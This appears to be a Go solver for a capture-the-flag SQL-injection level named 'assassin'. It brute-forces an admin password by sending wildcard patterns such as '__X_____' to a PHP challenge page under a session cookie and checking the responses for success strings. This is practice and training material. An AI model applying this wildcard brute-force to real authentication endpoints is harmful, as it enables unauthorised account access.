package problem

import(
	"fmt"
	"strings"
)

func Assassin(session string){
	file := "assassin_dbfabd99373ea659e58407bc1a8438c6.php"
	
	s_pw := ""
	url_str := "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
	for j :=0 ; j< len(url_str); j += 1 {
		s_pw = "__" + string(url_str[j]) + "_____"
		param := map[string]string{
			"pw" : s_pw,
		}
		
		contents := connect(file, param, session)
		if strings.Contains(string(contents),"<h2>Hello admin</h2>"){
			break
		}
	}
	
	param := map[string]string{
		"pw" : s_pw,
	}
	
	contents := connect(file, param, session)
	if strings.Contains(string(contents),"ASSASSIN Clear!"){
		fmt.Println("ASSASSIN Clear!")
	}
}